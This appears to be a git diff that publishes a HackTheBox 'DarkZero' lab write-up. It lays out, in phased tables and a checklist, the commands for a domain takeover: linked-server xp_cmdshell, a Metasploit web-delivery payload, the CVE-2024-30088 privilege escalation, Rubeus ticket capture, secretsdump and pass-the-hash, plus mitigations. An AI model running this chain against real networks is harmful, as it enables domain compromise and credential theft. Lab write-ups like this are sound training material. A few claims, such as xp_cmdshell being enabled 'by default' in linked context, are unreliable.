@@ -32,11 +32,7 @@ Using the credentials **john.w:RFulUtONCOL!**, I performed service enumeration a
 ![DarkZero](Pictures/htb_DarkZero_Mind_Map.png)
 
 
-**⚠️ Notice:
-This challenge is currently active on HackTheBox.
-In accordance with HackTheBox's content policy, this writeup will be made publicly available only after the challenge is retired.**
 
-<!--
 
 ## Recon & host discovery
 
@@ -274,20 +270,91 @@ type C:\Users\Administrator\Desktop\root.txt
 ![DarkZero](Pictures/htb_darkzero_Root_Flag.jpg)
 
 
-## About the captured hash & why `xp_dirtree` triggered it
-
-When `xp_dirtree` is executed, the SQL Server process on DC01 attempts to access the SMB share on DC02. The process requests a Kerberos service ticket (TGS) for the target service (e.g., `cifs/DC02`). If Kerberos authentication fails (due to SPN issues, DNS, time sync, policy, etc.), it falls back to NTLM, causing DC01 to send an NTLM challenge/response hash to DC02. Rubeus observes the ticket issuance or fallback and outputs the base64 ticket (or the NTLM-related material) which is then used for further offline or relay attacks. Which account is used (DC01$ or a domain service account) depends on the SQL Server service account configuration.
 
 
+## Phase 1: Defining the Concept (The “What” and “Why”)  
 
-## Notes & mitigation
-
-* Disable or restrict `xp_cmdshell` and remove unnecessary linked server trust relationships.
-* Ensure SQL Server service accounts run with least privilege.
-* Harden Kerberos: ensure SPNs are correct, time sync is maintained, and monitoring for unusual ticket requests is in place.
-* Monitor for unexpected SMB accesses and unusual Kerberos ticket issuance.
+| # | Item | Description |
+|||-|
+| **1.1 High‑Level Definition** | **Kerberos‑based lateral movement via SQL Server linked servers + local privilege escalation** | The attacker abuses a Microsoft SQL Server instance on the domain controller (DC01) to execute `xp_cmdshell` on a remote linked server (DC02). From there, the attacker elevates privileges with CVE‑2024‑30088 and ultimately harvests Kerberos tickets to pivot into the entire domain. |
+| **1.2 Immediate Impact** | **Full administrative control over the target network** | The chain delivers `NT AUTHORITY\SYSTEM` on DC02 → domain‑wide Kerberos ticket theft → remote execution as `Administrator`. This yields the root flag (`C:\Users\Administrator\Desktop\root.txt`). |
+| **1.3 Setting the Stage** | *Scenario* | 1️⃣ A multihomed DC exposes a public IP (10.10.11.89) and an internal IP (172.16.20.1). 2️⃣ DNS split‑horizon hides the internal interface from external scanners. 3️⃣ The attacker first enumerates SMB shares, discovers a linked server to DC02, then escalates privileges locally on DC01, pivots to DC02 via `xp_cmdshell`, and finally steals Kerberos tickets for domain‑wide compromise. |
 
 
 
+## Phase 2: Foundational Theory (The “Underlying System”)  
 
--->
+| # | Item | Explanation |
+|||-|
+| **2.1 Protocol/System Introduction** | **Active Directory + Microsoft SQL Server 2016** | • AD provides Kerberos authentication, domain‑wide trust relationships.• SQL Server hosts a `Linked Servers` configuration pointing to DC02 (`DC02.darkzero.ext`). |
+| **2.2 Core Components** | • **DNS** (split‑horizon: `10.10.11.89` ↔ `172.16.20.1`) • **Kerberos** (`88/tcp`, `3268/3269` global catalog) • **SMB** (`139/445`) • **LDAP** (`389/636`) • **SQL Server** (`1433`) with linked server • **Metasploit** & **Impacket** tools for exploitation. |
+| **2.3 Analogy / Metaphor** | *Think of the DC as a bank vault that mistakenly allows an employee (the SQL service) to open another vault inside the same building using a key (linked server). That key is forged, giving the attacker access to all other vaults in the building.* |
+
+
+
+## Phase 3: The Core Mechanism (The Specific Action)
+
+| # | Item | Details |
+||||
+| **3.1 Specific Inputs / Identifiers** | • **SPNs & Service Accounts**  - `DC01$` – SQL Server service account on DC01  - `dc01_sql_svc` – mapped remote login on DC02 via linked server• **SQL Credentials**  - Username: `john.w` (domain user)  - Password: `RFulUtONCOL!`• **Linked Server Name**: `DC02.darkzero.ext` |
+| **3.2 The Key Vulnerability Point** | • **Unrestricted Linked Server trust** – SQL Server allows `EXEC xp_cmdshell` to run under the remote server’s service account.• **xp_cmdshell enabled on DC02 via linked context** – no restrictions, enabling arbitrary command execution.• **CVE‑2024‑30088 local privilege escalation** (Windows 10/Server 2019/2022) – allows SYSTEM elevation from a user session. |
+| **3.3 Defining the Action** | 1️⃣ Connect to SQL Server on DC01 using `mssqlclient.py` with Windows auth.2️⃣ Query linked servers (`enum_links`) → discover `DC02.darkzero.ext`. 3️⃣ Switch context: `use_link "DC02.darkzero.ext"`. 4️⃣ Enable `xp_cmdshell` in that context. 5️⃣ Execute a base64‑encoded PowerShell web‑delivery payload via `xp_cmdshell`. 6️⃣ Get Meterpreter shell as `darkzero-ext\svc_sql` (internal IP 172.16.20.2).7️⃣ Run Metasploit’s local exploit (`cve_2024_30088_authz_basep`) to elevate to SYSTEM on DC02.8️⃣ Use Rubeus to monitor Kerberos and capture TGT/TGS tickets during subsequent SMB access (e.g., `xp_dirtree`).9️⃣ Convert the captured `.kirbi` file to a ccache (`kinit -i`). 10️⃣ Dump domain secrets with `impacket‑secretsdump -k`. 11️⃣ Use `evil-winrm` or `psexec.py` with NTLM hash to log in as `Administrator`. |
+
+
+
+## Phase 4: Prerequisites and Conditions
+
+| # | Requirement | Details |
+||-||
+| **4.1 Required Credentials / Access** | • Domain user (`john.w`) with SQL Server login rights.• Password: `RFulUtONCOL!` (known from prior enumeration).• Ability to enable `xp_cmdshell` on the remote linked server via SQL context. |
+| **4.2 Required Connectivity** | • TCP ports open: 53, 88, 135, 139, 389, 445, 636, 1433, 3268/3269.• Network path from attacker → DC01 (10.10.11.89).• Internal network pivot to DC02 via SMB share (`\\DC02.darkzero.ext\XXXX`). |
+| **4.3 Required Target Configuration** | • Linked Server `DC02.darkzero.ext` configured to use local account `darkzero\john.w` → remote login `dc01_sql_svc`. • Kerberos service principals exist for `cifs/` services on DC02.• SQL Server allows `xp_cmdshell` execution in linked context (default). |
+
+
+
+## Phase 5: Execution and Target Scouting
+
+| # | Task | Tool / Command |
+|||-|
+| **5.1 Target Identification** | Enumerate SMB shares on DC01 and linked server• `nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts`• `smbmap -H 10.10.11.89 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'` |
+| **5.2 Target Filtering** | • Use `dig @DC01.darkzero.htb ANY darkzero.htb` to discover split‑horizon.• Identify internal IPs via `ifconfig` in Meterpreter (`172.16.20.2`). |
+| **5.3 High‑Value Selection** | • Linked Server (`DC02.darkzero.ext`) – gives remote shell on a different DC.• Local privilege escalation (CVE‑2024‑30088).• Kerberos ticket capture via Rubeus during SMB activity. |
+
+
+
+## Phase 6: Technical Implementation and Tools
+
+| # | Sub‑Phase | Tool(s) & Command |
+||--|-|
+| **6.1 Automation Tools** | • `msfconsole` (web_delivery, local exploit)• `impacket-mssqlclient.py`, `psexec.py`• `nmap -A`, `smbmap`, `dig` |
+| **6.2 Operational Security (Covertness)** | • Use HTTPS (LPORT 443) for web‑delivery payload.• Hide Meterpreter session behind SMB share (`%temp%\agent.exe`).• Rubeus runs in background with `/interval:1 /nowrap`. |
+| **6.3 Offline Processing / Cracking** | • Convert `.kirbi` to ccache via `ticketConverter.py`. • Use `impacket‑secretsdump -k` for offline NTLM hash extraction.• Employ `evil-winrm` or `psexec.py` with the extracted hash. |
+
+
+
+## Phase 7: Real‑World Context and Defense
+
+| # | Item | Detail |
+|||--|
+| **7.1 Real‑World Application** | • APT groups (e.g., FIN6, APT28) frequently abuse SQL Server linked servers for lateral movement.• CVE‑2024‑30088 has been reported in several Windows Server 2019/2022 environments. |
+| **7.2 Detection Difficulty** | • `xp_cmdshell` usage via linked server is subtle and appears as legitimate DB activity.• Kerberos ticket theft shows up only as “new TGT/TGS” events; not necessarily flagged as malicious.• Local privilege escalation may not trigger IDS if the exploit uses in‑memory techniques. |
+| **7.3 Mitigation Strategy** | 1️⃣ Disable or tightly restrict `xp_cmdshell` (unless absolutely required). 2️⃣ Remove unnecessary linked servers or enforce “only trusted users” policy.3️⃣ Ensure SQL Server service accounts run with least privilege and are not domain‑level. 4️⃣ Harden Kerberos: correct SPNs, enforce time sync, enable Ticket‑Granting Ticket (TGT) auditing (`KDC-Logon` events). 5️⃣ Deploy host‑based intrusion detection to flag unusual SMB accesses from SQL Server processes.6️⃣ Regularly review and revoke domain service accounts with wide privileges. |
+| **7.4 Focus on Personnel** | • Security teams must audit database server configurations for `xp_cmdshell` and linked servers.• DBAs should enforce “least privilege” when creating remote connections.• Incident responders need to correlate Kerberos logs with SMB activity to spot lateral movement early. |
+
+
+
+### Quick Reference Checklist
+
+| Step | Action | Command |
+||--||
+| 1 | Scan DC01 | `nmap -p 1-65535 -T4 -A -v 10.10.11.89` |
+| 2 | Enumerate SMB & linked servers | `smbmap`, `mssqlclient.py` |
+| 3 | Enable `xp_cmdshell` on linked server | `use_link "DC02.darkzero.ext" ; enable_xp_cmdshell` |
+| 4 | Deploy web‑delivery payload | `msfconsole -q -x "... exploit/multi/script/web_delivery ..."` |
+| 5 | Gain SYSTEM via CVE‑2024‑30088 | `exploit/windows/local/cve_2024_30088_authz_basep` |
+| 6 | Capture Kerberos tickets with Rubeus | `Rubeus.exe monitor /interval:1 /nowrap` + trigger SMB access |
+| 7 | Convert ticket to ccache | `ticketConverter.py ticket.kirbi dc01_admin.ccache` |
+| 8 | Dump domain secrets | `impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'` |
+| 9 | Login as Administrator | `evil-winrm -i 10.10.11.89 -u administrator -H <hash>` |
+| 10 | Read root flag | `type C:\Users\Administrator\Desktop\root.txt` |
+
